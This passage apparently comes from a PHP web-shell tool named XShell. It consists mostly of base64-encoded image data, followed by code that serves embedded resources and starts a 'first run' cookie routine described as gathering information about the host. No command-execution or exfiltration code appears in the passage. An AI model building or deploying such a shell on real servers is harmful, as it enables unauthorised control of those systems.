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UUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQB//2Q==');
		
		if (isset ($_GET ['resource']))
		{
			if (isset ($_RESOURCE [$_GET ['resource']]))
			{
				define ('NO_CONTENT', 1);
				header ("Cache-control: public");
				header ("Expires: " . date ("r", mktime (0, 0, 0, 1, 1, 2030)));
				header ("Cache-control: max-age=" . (60 * 60 * 24 * 7));
				header ("Last-Modified: " . date ("r", filemtime (__FILE__)));
				echo $_RESOURCE [$_GET ['resource']];
				die ();
			}
		}
		
		/* *************************************************************************** */
		/*                              == First Run ==                                */
		/*  Gather basic information about the host;                                   */
		/*  TODO: Add support for session-based data storage, or possibly file         */
		/*  based for awkward people who don't like cookies. Mmmm.. cookies...         */
		/*                                                                             */
		/* *************************************************************************** */
		
		if (isset ($_GET ['first_run']))
		{
			setcookie ('XSHELL_FIRST_RUN', 0, time () - 3600);
			$_COOKIE ['XSHELL_FIRST_RUN_STEP'] = 0;
			setcookie ('XSHELL_FIRST_RUN_STEP', 0);
		}
		
		if (isset ($_GET ['no_first_run']))
		{
			setcookie ('XSHELL_FIRST_RUN_STEP', 0);
		}
		if (!isset ($_COOKIE ['XSHELL_FIRST_RUN_STEP'])) {$_COOKIE ['XSHELL_FIRST_RUN_STEP'] = 0; setcookie ('XSHELL_FIRST_RUN_STEP', 0);}
		
